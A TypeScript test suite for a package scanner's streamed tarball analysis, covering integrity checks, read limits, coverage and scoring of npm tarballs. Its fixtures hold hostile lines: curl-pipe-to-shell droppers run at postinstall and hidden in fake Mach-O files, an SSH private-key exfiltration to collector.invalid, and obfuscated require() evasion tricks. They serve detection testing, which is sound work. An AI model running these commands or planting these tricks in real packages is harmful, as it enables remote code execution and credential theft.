// The streamed run (streamed-analysis.ts) on tarballs made here and served from memory: nothing it read is used until
// every byte matched the version's sha512 and the declared length, a source that fails or stalls is a fetch failure to
// retry, the limits refuse what they say, and a package whose code is over the budget is scored incomplete, never
// clean. streamed-analysis.workerd.test.ts measures the same run inside workerd on real tarballs.
import { describe, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { analyzeStreamedTarball, IMPORTS_CUT_TEXT, READ, type ReadLimits, type StreamedAnalysis } from "../src/streamed-analysis.ts";
import type { VersionRecord } from "../src/db.ts";
import type { Digest } from "../src/digest.ts";
import type { OpenedTarball, UpstreamPackage } from "../src/upstream.ts";
import { MemoryPool } from "../src/memory.ts";
import { CPU_ARM64, CPU_X86_64, elf, fatMachO, machO } from "../../core/test/executables.ts";
import { finalize, MAX_VIEW_CHARS, readingOf, SCORE_FLOOR } from "@apm/core";

/** A lease with room for anything these tarballs keep, as a queue job's is. */
const lease = () => new MemoryPool(1 << 30).request(256 * 1024 * 1024);

const enc = new TextEncoder();
const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

function tgz(files: Record<string, Uint8Array | string>): Uint8Array {
  const parts: Uint8Array[] = [];

  for (const [name, content] of Object.entries(files)) {
    const data = content instanceof Uint8Array ? content : enc.encode(content);
    const h = new Uint8Array(512);
    const put = (s: string, at: number): void => h.set(enc.encode(s), at);
    put(`package/${name}`, 0);
    put("0000644\0", 100);
    put("0000000\0", 108);
    put("0000000\0", 116);
    put(`${data.length.toString(8).padStart(11, "0")}\0`, 124);
    put("00000000000\0", 136);
    put("        ", 148);
    put("0", 156);
    put("ustar\0", 257);
    put("00", 263);
    put(`${h.reduce((n, b) => n + b, 0).toString(8).padStart(6, "0")}\0 `, 148);
    parts.push(h, data, new Uint8Array((512 - (data.length % 512)) % 512));
  }

  parts.push(new Uint8Array(1024));

  return Bun.gzipSync(Buffer.concat(parts));
}

const sha512 = (b: Uint8Array): Digest => ({ algo: "sha512", hex: createHash("sha512").update(b).digest("hex") });

const v: VersionRecord = {
  package: "pkg",
  version: "1.0.0",
  manifest: {},
  shasum: "",
  integrity: "",
  size: 0,
  tarball_key: "",
  published_at: 0,
  seq: 0,
  published_by: "someone",
  deprecated: null,
  status: "active",
  status_reason: null,
  status_at: null,
  status_by: null,
  score: null,
};

const pkg: UpstreamPackage = { name: "pkg", distTags: { latest: "1.0.0" }, description: "", readme: "", maintainers: [], versions: [v], tarballs: new Map(), serveCost: { versionDocs: 0, maxPieceChars: 0 }, etag: null };

/** `bytes` as a source answers them, in 64 KiB chunks; `declared` is the length it claims (its own by default). */
function source(bytes: Uint8Array, opts: { declared?: number | null; failAt?: number; stallAt?: number } = {}) {
  let opens = 0;

  return {
    opens: () => opens,
    open: async () => {
      opens++;
      let at = 0;

      const body = new ReadableStream<Uint8Array>({
        pull(c) {
          if (opts.failAt !== undefined && at >= opts.failAt) {
            c.error(new Error("connection reset"));

            return;
          }

          if (opts.stallAt !== undefined && at >= opts.stallAt) return new Promise<void>(() => undefined);

          if (at >= bytes.length) {
            c.close();

            return;
          }

          c.enqueue(bytes.slice(at, at + 65536));
          at += 65536;
        },
      });

      return { kind: "stream", body, length: opts.declared === undefined ? bytes.length : opts.declared, digest: sha512(bytes) } satisfies OpenedTarball;
    },
  };
}

async function analyzeWith(bytes: Uint8Array, opts: { digest?: Digest; limits?: Partial<ReadLimits>; src?: ReturnType<typeof source> } = {}): Promise<{ result: StreamedAnalysis; opens: number }> {
  const src = opts.src ?? source(bytes);

  const result = await analyzeStreamedTarball({
    pkg,
    v,
    digest: opts.digest ?? sha512(bytes),
    open: src.open,
    plan: { maxWork: 320_000_000 },
    memory: lease(),
    limits: { ...READ, ...opts.limits },
  });

  return { result, opens: src.opens() };
}

const MANIFEST = JSON.stringify({ name: "pkg", version: "1.0.0", license: "MIT", main: "index.js" });

describe("a streamed run", () => {
  const small = tgz({ "package.json": MANIFEST, "index.js": "module.exports = require('./lib.js');\n", "lib.js": "module.exports = 1;\n", "addon.node": new Uint8Array([0x7f, 0x45, 0x4c, 0x46, ...Array.from({ length: 70_000 }, () => 3)]) });

  test("reads a package whose code fits in one pass, completely", async () => {
    const { result, opens } = await analyzeWith(small);

    expect(result.kind).toBe("scored");
    expect(opens).toBe(1);

    if (result.kind === "scored") expect(result.analysis.signals.find((s) => s.id === "incomplete")).toBeUndefined();
  });

  test("reads code past what the first pass could hold in a second pass, and code past the budget makes coverage partial", async () => {
    // the extra files come first, so the first pass fills what it may hold with them before the entry's code arrives
    const files: Record<string, string> = {};

    for (let i = 0; i < 10; i++) files[`extra/x${i}.js`] = `module.exports = '${"x".repeat(20_000)}';\n`;
    Object.assign(files, { "package.json": MANIFEST, "index.js": "module.exports = [require('./a.js'), require('./b.js')];\n", "a.js": `module.exports = '${"a".repeat(30_000)}';\n`, "b.js": `module.exports = '${"b".repeat(30_000)}';\n` });
    const { result, opens } = await analyzeWith(tgz(files), { limits: { holdBytes: 80_000 } });

    expect(opens).toBe(2);
    expect(result.kind).toBe("scored");

    if (result.kind !== "scored") return;
    // every file the walk reaches was held; only extra files nothing loads went unread: partial coverage, no points
    expect(result.analysis.skipped.every((s) => s.path.startsWith("extra/") && s.reason === "over-budget")).toBe(true);
    expect(result.analysis.skipped.length).toBeGreaterThan(0);
    expect(result.analysis.coverage).toMatchObject({ kind: "partial", omittedFiles: result.analysis.skipped.length, reasons: ["over-budget"] });
    expect(result.analysis.signals.find((s) => s.id === "incomplete")).toBeUndefined();
  });

  // @typescript/typescript-darwin-arm64 7.0.2: a Mach-O executable with no extension, past what the run holds. It is
  // listed as native code from its first bytes, and the reading is complete: not a file left unread
  // round 11 review of ee69d23: production's plan held a Mach-O like any text file, within its budget, and read it; one
  // past the budget it left unread. Here too: within it, held and read whole; past it, unread at its size
  test("a Mach-O executable is listed as native code: within the budget held and read, the reading complete; past it unread", async () => {
    const files = { "package.json": JSON.stringify({ name: "pkg", version: "1.0.0", license: "MIT", main: "index.js" }), "index.js": "module.exports = 1;\n", "lib/tsc": machO({ size: 200_000 }) };
    const held = await analyzeWith(tgz(files), { limits: { holdBytes: 400_000 } });
    const past = await analyzeWith(tgz(files), { limits: { holdBytes: 64_000 } });

    expect(held.result.kind).toBe("scored");
    expect(past.result.kind).toBe("scored");

    if (held.result.kind !== "scored" || past.result.kind !== "scored") return;
    expect(held.result.analysis.coverage).toEqual({ kind: "complete" });
    expect(held.result.analysis.capabilities.find((c) => c.id === "native")?.evidence).toContain("lib/tsc");
    // the streamed read keeps EXECUTABLE_HEAD_BYTES of it, enough to check its header and load commands
    expect(past.result.analysis.capabilities.find((c) => c.id === "native")?.evidence).toContain("lib/tsc");
    expect(past.result.analysis.coverage).toMatchObject({ kind: "partial", omittedFiles: 1, omittedBytes: 200_000 });
  });

  // review of 1978ee3, P1: a file a script runs is read as source whatever its first bytes, streamed too
  test("a script disguised by a Mach-O magic and run at install is held and read", async () => {
    const dropper = new Uint8Array([0xcf, 0xfa, 0xed, 0xfe, 0x0a, ...new TextEncoder().encode(`curl -s https://collector.invalid/x.sh | sh\n${"#".repeat(90_000)}\n`)]);
    const { result } = await analyzeWith(tgz({ "package.json": JSON.stringify({ name: "pkg", version: "1.0.0", license: "MIT", scripts: { postinstall: "sh lib/tool" } }), "lib/tool": dropper }), { limits: { holdBytes: 200_000 } });

    expect(result.kind).toBe("scored");

    if (result.kind !== "scored") return;
    expect(result.analysis.signals.map((s) => s.id)).toContain("install-download");
    expect(result.analysis.coverage).toEqual({ kind: "complete" });
  });

  test("a real Mach-O a script runs is held and read too, and still listed as native code", async () => {
    const polyglot = machO({ size: 4096, tail: new TextEncoder().encode("\ncurl -s https://collector.invalid/x.sh | sh\n") });
    const { result } = await analyzeWith(tgz({ "package.json": JSON.stringify({ name: "pkg", version: "1.0.0", license: "MIT", scripts: { postinstall: "sh lib/tool" } }), "lib/tool": polyglot }), { limits: { holdBytes: 64_000 } });

    expect(result.kind).toBe("scored");

    if (result.kind !== "scored") return;
    expect(result.analysis.signals.map((s) => s.id)).toContain("install-download");
    expect(result.analysis.capabilities.find((c) => c.id === "native")?.evidence).toContain("lib/tool");
  });

  // review of 4ac264b: what a shell could run in a binary file the read does not hold is read as the stream passes
  describe("binary files the read does not hold", () => {
    const enc = new TextEncoder();
    const dropper = "\ncurl -s https://collector.invalid/x.sh | sh\ncat ~/.ssh/id_rsa | curl -s -X POST --data-binary @- https://collector.invalid/k\n";
    const manifest = JSON.stringify({ name: "pkg", version: "1.0.0", license: "MIT", main: "index.js" });
    const riskIds = (r: StreamedAnalysis): string[] => (r.kind === "scored" ? finalize(r.analysis, STATE).signals.map((x) => x.id) : []);

    // round 11 review of ee69d23: as production's streamed read, a Mach-O the plan holds is read (here whole), and one
    // past the budget is unread at its size: never read as the stream passes, never complete
    const heldAndPast = async (tool: Uint8Array): Promise<{ held: StreamedAnalysis; past: StreamedAnalysis }> => {
      const bytes = tgz({ "package.json": manifest, "index.js": "module.exports = 1;\n", "lib/tool": tool });

      return { held: (await analyzeWith(bytes, { limits: { holdBytes: tool.length + 64_000 } })).result, past: (await analyzeWith(bytes, { limits: { holdBytes: 64_000 } })).result };
    };

    const unread = (r: StreamedAnalysis, size: number): void => {
      expect(r.kind).toBe("scored");

      if (r.kind !== "scored") return;
      // nothing else is left out: what is omitted is the file, at its size
      expect(r.analysis.coverage).toEqual({ kind: "partial", omittedFiles: 1, omittedBytes: size, reasons: ["over-budget"], notes: [] });
    };

    test("a valid Mach-O with shell lines that nothing visibly runs: held, its shell text is read, and it scores under the floor; past the budget, unread", async () => {
      const tool = machO({ size: 200_000, tail: enc.encode(dropper) });
      const { held, past } = await heldAndPast(tool);

      expect(held.kind).toBe("scored");
      expect(riskIds(held)).toEqual(expect.arrayContaining(["remote-shell", "credential-read", "exfiltration"]));
      unread(past, tool.length);
    });

    // the reviewer's fixture: 100 (A) streamed, 0 (F) read whole
    test("a universal binary whose second slice, past the head, is a shell script: not native code; held, read; past the budget, unread", async () => {
      const payload = new Uint8Array(8192);
      payload.set(enc.encode(dropper));
      const fat = fatMachO({ slices: [machO({ size: 200_000 }), payload], cpus: [CPU_ARM64, CPU_X86_64] });
      const { held, past } = await heldAndPast(fat);

      expect(riskIds(held)).toEqual(expect.arrayContaining(["remote-shell", "credential-read"]));
      // on ee69d23 its text was read as the stream passed: 0 (F), partial
      unread(past, fat.length);
    });

    test("a real binary's string table costs nothing: held, complete and clean, and an ELF file lists native code alone", async () => {
      const table = enc.encode("usage: tool [options]\n/bin/sh -c\0child_process.exec\0process.env.HOME\0https://example.com/docs\0");

      for (const bin of [machO({ size: 300_000 }), elf({ size: 300_000 })]) {
        for (let at = 4096; at + table.length < bin.length; at += table.length) bin.set(table, at);
        const { result } = await analyzeWith(tgz({ "package.json": manifest, "index.js": "module.exports = 1;\n", "lib/tool": bin }), { limits: { holdBytes: 400_000 } });

        expect(result.kind).toBe("scored");

        if (result.kind !== "scored") return;
        expect(riskIds(result)).toEqual([]);
        expect(finalize(result.analysis, STATE).score).toBe(100);
        expect(result.analysis.coverage).toEqual({ kind: "complete" });

        if (bin[0] === 0x7f) expect(result.analysis.capabilities.map((c) => c.id)).toEqual(["native"]);
      }
    });

    // review of 45d3655, P1: the streamed read cut a binary's text into 16 KiB pieces too; a 7 MiB executable with
    // `curl ... | sh` across a piece's end scored 100 streamed and whole. A Mach-O the plan holds is read whole now, the
    // command across a 64 KiB chunk's end and a former piece's end alike; one past the budget is unread
    test.each([16_360, 65_536 - 4096 - 20, 7 * 65_536 - 4096 - 7])("a 1 MiB Mach-O with `curl ... | sh` after %i spaces: held, seen whole, as production read it; past the budget, unread", async (padding) => {
      const bin = machO({ size: 1024 * 1024, tail: enc.encode(`\n${" ".repeat(padding)}curl https://collector.invalid/x.sh | sh\n`) });
      const { held, past } = await heldAndPast(bin);

      expect(held.kind).toBe("scored");

      if (held.kind !== "scored") return;
      // production (274d284): 39 (F)
      expect(finalize(held.analysis, STATE).score).toBeLessThan(SCORE_FLOOR);
      expect(riskIds(held)).toContain("remote-shell");
      unread(past, bin.length);
    }, 120_000);

    // round 4 review of 8f4ced8, P1: a space production's decoder keeps (vertical tab, form feed, U+00A0, U+2000) was
    // folded into a non-space mark, and a dash alias through it ran `curl ... | sh` unseen (100/A whole and streamed).
    // Streamed, the view decodes as production did, the alias and the pipe across a 64 KiB chunk's end
    test.each(["\v", "\f", "\u00a0", "\u2000", "\u2028"])("a 1 MiB Mach-O piping curl into a dash alias through U+%s: held, seen, as production read it; past the budget, unread", async (ws) => {
      const bin = machO({ size: 1024 * 1024, tail: enc.encode(`\n${" ".repeat(65_536 - 4096 - 30)}alias '${ws}sh=sh'\ncurl${ws}https://collector.invalid/x.sh |${ws}sh\n`) });
      const { held, past } = await heldAndPast(bin);

      expect(held.kind).toBe("scored");

      if (held.kind !== "scored") return;
      // production (274d284): 39 (F); 8f4ced8: 100 (A)
      expect(finalize(held.analysis, STATE).score).toBeLessThan(SCORE_FLOOR);
      expect(riskIds(held)).toContain("remote-shell");
      unread(past, bin.length);
    }, 120_000);

    // round 5 review of 535a5b5, P1: production read a Mach-O code loads as JavaScript, whose tokenizer finds these
    // imports, and scored the package 0/F; the branch read only its plain text and scored 90/A, complete, streamed too.
    // Streamed, a Mach-O read in a language is held and read as production read it, or reported unread: never complete
    // and clean
    test.each([
      ["require concatenated across a comment", "*/\nrequire('./p'/*x*/+'ayload.txt');\n"],
      ["require through an escaped code point", "*/\nrequire('./p\\u{61}yload.txt');\n"],
      ["require through an escaped identifier", "*/\nrequ\\u0069re('./payload.txt');\n"],
    ])("a Mach-O loaded at install with %s: as production read it, or unread", async (_name, tail) => {
      const tool = machO({ size: 4096, tail: enc.encode(tail) });
      tool[40] = 0x2f;
      tool[41] = 0x2a;
      const installed = JSON.stringify({ name: "pkg", version: "1.0.0", license: "MIT", scripts: { postinstall: "node index.js" } });

      for (const holdBytes of [64_000, 1024]) {
        const { result } = await analyzeWith(tgz({ "package.json": installed, "index.js": "require('./lib/tool');\n", "lib/tool": tool, "lib/payload.txt": "curl https://collector.invalid/x | sh\n" }), { limits: { holdBytes } });

        expect(result.kind).toBe("scored");

        if (result.kind !== "scored") return;
        const r = finalize(result.analysis, STATE);

        // on 535a5b5: 90 (A), complete, at either hold
        expect(r.coverage?.kind === "complete" && r.score >= SCORE_FLOOR).toBe(false);
      }
    }, 120_000);

    // round 6 review of fbc6738, P1: a load found in one plain binary (lib/first: `require('./tool')`) never made the
    // second (lib/tool) code, so it was read through the plain view; streamed and not held, both scored A, complete.
    // Loaded, it is read as production read code, or reported unread: never complete and clean
    test.each([
      ["a comment between concatenated strings", "*/\nrequire('./p'/*x*/+'ayload.txt');\n"],
      ["an escaped code point in the path", "*/\nrequire('./p\\u{61}yload.txt');\n"],
      ["an escaped identifier", "*/\nrequ\\u0069re('./payload.txt');\n"],
    ])("two Mach-O files down from index.js, the second with %s: as production read it, or unread", async (_name, tail) => {
      const commented = (t: string): Uint8Array => {
        const bin = machO({ size: 4096, tail: enc.encode(t) });
        bin[40] = 0x2f;
        bin[41] = 0x2a;

        return bin;
      };

      for (const fields of [{ scripts: { postinstall: "node index.js" } }, { main: "index.js" }]) {
        const pkg = JSON.stringify({ name: "pkg", version: "1.0.0", license: "MIT", ...fields });

        for (const holdBytes of [64_000, 1024]) {
          const files = { "package.json": pkg, "index.js": "const p = __dirname + '/lib/first';\n", "lib/first": commented("*/\nrequire('./tool');\n"), "lib/tool": commented(tail), "lib/payload.txt": "curl https://collector.invalid/x | sh\n" };
          const { result } = await analyzeWith(tgz(files), { limits: { holdBytes } });

          expect(result.kind).toBe("scored");

          if (result.kind !== "scored") return;
          const r = finalize(result.analysis, STATE);

          // on fbc6738: A, complete, at holdBytes 1024
          expect(r.coverage?.kind === "complete" && r.score >= SCORE_FLOOR).toBe(false);
        }
      }
    }, 120_000);

    // round 8 review: a stand-in path reached an extra file whose path reached lib/bridge.dat before a load did, so
    // bridge.dat was read as plain text; streamed and not held, 39/F and 0/F became A, complete. Read as code once
    // anything loads it, or reported unread: never complete and clean
    test.each([
      ["a comment between concatenated strings", "require('./p'/*x*/+'ayload.txt');\n"],
      ["an escaped code point in the path", "require('./p\\u{61}yload.txt');\n"],
      ["an escaped identifier", "requ\\u0069re('./payload.txt');\n"],
    ])("a file a stand-in path reaches early, then loaded, with %s: as production read it, or unread", async (_name, tail) => {
      const commented = (t: string): Uint8Array => {
        const bin = machO({ size: 4096, tail: enc.encode(`*/\n${t}`) });
        bin[40] = 0x2f;
        bin[41] = 0x2a;

        return bin;
      };

      for (const fields of [{ scripts: { postinstall: "node index.js" } }, { main: "index.js" }]) {
        const pkg = JSON.stringify({ name: "pkg", version: "1.0.0", license: "MIT", ...fields });

        for (const holdBytes of [64_000, 1024]) {
          const files = {
            "package.json": pkg,
            "index.js": "const p = __dirname + '/lib/first';\n",
            "lib/first": commented("require('./t\u6f22');\n"),
            "lib/t\u5b57": "const p = __dirname + '/bridge.dat';\n",
            "lib/t\u6f22": "require('./middle');\n",
            "lib/middle": "require('./bridge.dat');\n",
            "lib/bridge.dat": tail,
            "lib/payload.txt": "curl https://collector.invalid/x | sh\n",
          };

          const { result } = await analyzeWith(tgz(files), { limits: { holdBytes } });

          expect(result.kind).toBe("scored");

          if (result.kind !== "scored") return;
          const r = finalize(result.analysis, STATE);

          // the round 8 review's reading of 1c53ca8: A, complete, at holdBytes 1024
          expect(r.coverage?.kind === "complete" && r.score >= SCORE_FLOOR).toBe(false);
        }
      }
    }, 120_000);

    test("a Mach-O whose text is too large to hold is reported unread, never read in part", async () => {
      const bin = new Uint8Array(MAX_VIEW_CHARS + 65_536);
      bin.set(machO({ size: 4096 }));
      bin.fill(0x20, 4096);
      const { result } = await analyzeWith(tgz({ "package.json": manifest, "index.js": "module.exports = 1;\n", "lib/tool": bin }), { limits: { holdBytes: 64_000 } });

      expect(result.kind).toBe("scored");

      if (result.kind !== "scored") return;
      expect(result.analysis.coverage).toMatchObject({ kind: "partial" });
      expect(result.analysis.skipped.map((x) => x.path)).toContain("lib/tool");
    }, 120_000);
  });

  test("bytes that do not match their sha512, or their declared length, are not used", async () => {
    const other = sha512(enc.encode("other bytes"));
    const wrongHash = await analyzeWith(small, { digest: other, src: { opens: () => 1, open: async () => ({ ...(await source(small).open()), digest: other }) } });
    const shortBody = await analyzeWith(small, { src: source(small, { declared: small.length + 10 }) });

    expect(wrongHash.result).toEqual({ kind: "fetch-failed", reason: "the upstream tarball failed its integrity check", retryable: true });
    expect(shortBody.result).toEqual({ kind: "fetch-failed", reason: "the upstream tarball failed its integrity check", retryable: true });
  });

  test("a source that fails or stalls is a fetch failure to retry", async () => {
    const big = tgz({ "package.json": MANIFEST, "index.js": "1", "data.bin": crypto.getRandomValues(new Uint8Array(60_000)) });
    const failed = await analyzeWith(big, { src: source(big, { failAt: 65536 }) });
    const stalled = await analyzeWith(big, { src: source(big, { stallAt: 65536 }), limits: { idleMs: 50 } });

    expect(failed.result).toMatchObject({ kind: "fetch-failed", retryable: true });
    expect(stalled.result).toEqual({ kind: "fetch-failed", reason: "the tarball download stalled or took too long", retryable: true });
  });

  test("a version with only a sha1 checksum is not read", async () => {
    const { result, opens } = await analyzeWith(small, { digest: { algo: "sha1", hex: createHash("sha1").update(small).digest("hex") } });

    expect(result).toMatchObject({ kind: "unscorable", unscorable: { reason: "unavailable" } });
    expect(opens).toBe(0);
  });

  test("its limits refuse what they say, once the bytes have matched", async () => {
    const declaredOver = await analyzeWith(small, { limits: { maxTarballBytes: 64 } });
    const inflatesOver = await analyzeWith(tgz({ "package.json": MANIFEST, "a.txt": "0".repeat(300_000) }), { limits: { maxUnpackedBytes: 100_000 } });
    const notGzip = enc.encode("not a gzip stream at all, though its checksum is right");

    expect(declaredOver.result).toMatchObject({ kind: "unscorable", unscorable: { reason: "too-large" } });
    expect(inflatesOver.result).toMatchObject({ kind: "unscorable", unscorable: { reason: "too-large", detail: "the tarball inflates to more than 0 MB, the most apm reads as a stream" } });
    expect((await analyzeWith(notGzip)).result).toMatchObject({ kind: "unscorable", unscorable: { reason: "unreadable" } });
  });

  test("an archive that is not valid but whose bytes fail their checksum is a fetch failure, not a verdict", async () => {
    const notGzip = enc.encode("not a gzip stream at all");
    const other = sha512(enc.encode("x"));
    const { result } = await analyzeWith(notGzip, { digest: other, src: { opens: () => 1, open: async () => ({ ...(await source(notGzip).open()), digest: other }) } });

    expect(result).toMatchObject({ kind: "fetch-failed", reason: "the upstream tarball failed its integrity check" });
  });

  test("a path twice is unreadable, as for a tarball held whole", async () => {
    const twice = tgz({ "package.json": MANIFEST, "a.js": "1", "./a.js": "2" });

    expect((await analyzeWith(twice)).result).toMatchObject({ kind: "unscorable", unscorable: { reason: "unreadable" } });
  });

  test("a version the upstream no longer lists is absent", async () => {
    const result = await analyzeStreamedTarball({ pkg, v, digest: sha512(small), open: async () => ({ kind: "absent" }), plan: { maxWork: 1e6 }, memory: lease() });

    expect(result).toEqual({ kind: "absent" });
  });
});

// Round 12 review of 7cd0b2b, P3: 40,000 lines of 'a'+'b' cut the first pass's import graph (its joining passed the
// reading's temporary budget), and a report that left no file out dropped the note. A cut graph means the plan may have
// missed files production's followed: the reading is incomplete, said whether or not a file was left out
describe("a cut import graph", () => {
  const STATE_ = STATE;

  test.each([
    // on 7cd0b2b 40,000 cut it: what joining one chain builds was charged to the graph's lists too. Now about 70,000 do
    [40_000, false],
    [80_000, true],
  ])("%i lines of 'a'+'b': cut %p, and a cut graph is an incomplete reading", async (lines, cut) => {
    const manifest = JSON.stringify({ name: "pkg", version: "1.0.0", license: "MIT" });
    const { result } = await analyzeWith(tgz({ "package.json": manifest, "lib/a.py": "'a'+'b';\n".repeat(lines) }));

    expect(result.kind).toBe("scored");

    if (result.kind !== "scored") return;
    const report = finalize(result.analysis, STATE_);
    const incomplete = report.signals.find((s) => s.id === "incomplete");

    // the file itself was read whole: nothing is left out either way
    expect(result.analysis.coverage).toEqual({ kind: "complete" });

    if (cut) {
      // on 7cd0b2b: 100, complete, the cut said nowhere
      expect([...(incomplete?.evidence ?? []), ...(incomplete?.more ?? [])]).toContain(IMPORTS_CUT_TEXT);
      expect(readingOf(result.analysis).kind).toBe("incomplete");
      expect(report.score).toBeLessThan(SCORE_FLOOR);
    } else {
      expect(incomplete).toBeUndefined();
      expect(report.score).toBe(100);
    }
  }, 120_000);
});

// Round 17 review of b287849, P1: a pass that ran the stream's meter out came back too-large, which installs with a note,
// where production read the package and scored 35, review-first (an archive of 800 shell scripts whose words the first
// pass read). A spent pass, the first or the second, is an analysis that stopped: incomplete, scoring 0, as a plan or an
// analysis that runs its meter out is. Every meter from too small to read anything up to enough to read it all gives
// that or the whole reading, never a verdict about the tarball's size.
describe("a stream pass that runs its meter out", () => {
  const RISK = "/* fetch('x');readFileSync('.npmrc'); */\n";

  /** The run at each meter from `from` up, by `factor`, until one reads it whole; and that whole reading. */
  async function sweep(bytes: Uint8Array, from: number, factor: number, limits: Partial<ReadLimits> = {}) {
    const runs: { streamWork: number; result: StreamedAnalysis; opens: number }[] = [];

    for (let streamWork = from; ; streamWork = Math.ceil(streamWork * factor)) {
      const { result, opens } = await analyzeWith(bytes, { limits: { ...limits, streamWork } });

      runs.push({ streamWork, result, opens });

      if (result.kind === "scored" && result.analysis.signals.every((s) => s.id !== "incomplete")) return runs;

      if (streamWork > 1e9) throw new Error("never read whole");
    }
  }

  /** Each run is the whole reading (the last run's, with its meter to spare) or a stop at 0, and none installs. */
  function expectHeldOrWhole(runs: Awaited<ReturnType<typeof sweep>>): void {
    const last = runs.at(-1)?.result;
    const whole = last?.kind === "scored" ? finalize(last.analysis, STATE) : null;

    expect(whole?.score).toBeLessThan(SCORE_FLOOR);

    for (const { streamWork, result } of runs) {
      expect({ streamWork, kind: result.kind }).toEqual({ streamWork, kind: "scored" });

      if (result.kind !== "scored") continue;
      const report = finalize(result.analysis, STATE);
      const stopped = result.analysis.signals.find((s) => s.id === "incomplete");

      if (stopped) {
        expect({ streamWork, score: report.score, points: stopped.points }).toEqual({ streamWork, score: 0, points: -100 });
      } else {
        expect({ streamWork, score: report.score, ids: report.signals.map((s) => s.id) }).toEqual({ streamWork, score: whole?.score ?? -1, ids: whole?.signals.map((s) => s.id) ?? [] });
      }
    }
  }

  test("a shell script and a risk read in one pass: every meter gives the reading or a stop at 0, never too-large", async () => {
    const manifest = JSON.stringify({ name: "pkg", version: "1.0.0", license: "MIT", main: "setup.sh" });

    for (const n of [100, 1000]) {
      const runs = await sweep(tgz({ "package.json": manifest, "setup.sh": `#!/bin/sh\n${"true a\n".repeat(n)}`, target: RISK }), 200, 1.15);

      // on b287849 the meters that ran the pass out gave too-large
      expect(runs.some((r) => r.result.kind === "scored" && r.result.analysis.signals.some((s) => s.id === "incomplete"))).toBe(true);
      expectHeldOrWhole(runs);
    }
  }, 300_000);

  test("a second pass that runs the meter out is a stop at 0 too", async () => {
    // the extra files come first and fill what the first pass may hold, so the target's code is read in a second pass
    const files = Object.fromEntries([
      ["package.json", JSON.stringify({ name: "pkg", version: "1.0.0", license: "MIT", main: "index.js" })],
      ...Array.from({ length: 10 }, (_, i) => [`extra/x${i}.js`, `module.exports = '${"x".repeat(20_000)}';\n`]),
      ["index.js", "require('./target.js');\n"],
      // loaded, so read as JavaScript: the risk is code, not a comment
      ["target.js", "require('child_process').execSync('curl https://collector.invalid/x | sh');\n"],
    ]);

    const runs = await sweep(tgz(files), 2_000, 1.1, { holdBytes: 100_000 });

    expect(runs.some((r) => r.opens === 2 && r.result.kind === "scored" && r.result.analysis.signals.some((s) => s.id === "incomplete"))).toBe(true);
    expectHeldOrWhole(runs);
  }, 300_000);

  test("800 scripts of 100,001 words at the default limits: a stop at 0, held, where b287849 gave too-large", async () => {
    const words = `#!/bin/sh\n${"a ".repeat(100_001)}\n`;
    const files = Object.fromEntries([["package.json", JSON.stringify({ name: "pkg", version: "1.0.0", license: "MIT" })], ["target", RISK], ...Array.from({ length: 800 }, (_, i) => [`scripts/f${i}.sh`, words])]);
    const { result } = await analyzeWith(tgz(files));

    expect(result.kind).toBe("scored");

    if (result.kind === "scored") {
      const report = finalize(result.analysis, STATE);

      expect(report.score).toBe(0);
      expect(result.analysis.signals.find((s) => s.id === "incomplete")?.points).toBe(-100);
    }
  }, 300_000);
});
